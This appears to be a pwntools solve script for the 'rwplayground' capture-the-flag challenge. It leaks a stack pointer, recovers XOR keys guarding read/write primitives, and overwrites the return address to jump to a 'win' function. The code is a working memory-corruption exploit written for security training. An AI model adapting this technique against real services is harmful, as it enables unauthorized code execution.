from pwn import *

exe = ELF("./rwplayground_patched")

context.binary = exe

HOST = "rwplayground.challs.olicyber.it"
PORT = 38051

gdbscript = """
set follow-fork-mode child
"""

# args.LOCAL = True
args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

def leak_rsp(r):
    r.recvuntil(b"you... ")
    return int(r.recvline()[2:], 16) - 0x0c

def leak_read_xor(r):
    value = read_from(r, 0x402035)
    read_xor = value ^ int.from_bytes(b"/bin/sh\x00"[::-1])
    return read_xor

def leak_write_xor(r, read_xor):
    value = read_from(r, 0x4040B8)
    write_xor = value ^ read_xor
    return write_xor
    
def read_from(r, addr):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"where: ", hex(addr).encode())
    r.recvuntil(b"value: 0x")

    return int(r.recvline()[:-1], 16)
    
def write_to(r, addr, what, xor):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"where: ", hex(addr).encode())
    r.sendlineafter(b"what: ",  hex(what ^ xor).encode())

def main():
    r = conn()

    rsp = leak_rsp(r)
    log.success(f"LEAKED RSP: {hex(rsp)}")

    read_xor = leak_read_xor(r)
    log.success(f"LEAKED READ KEY: {hex(read_xor)}")

    write_xor = leak_write_xor(r, read_xor)
    log.success(f"LEAKED WRITE KEY: {hex(write_xor)}")
    
    write_to(r, rsp, exe.symbols.win, write_xor)
    r.interactive()

if __name__ == "__main__":
    main()
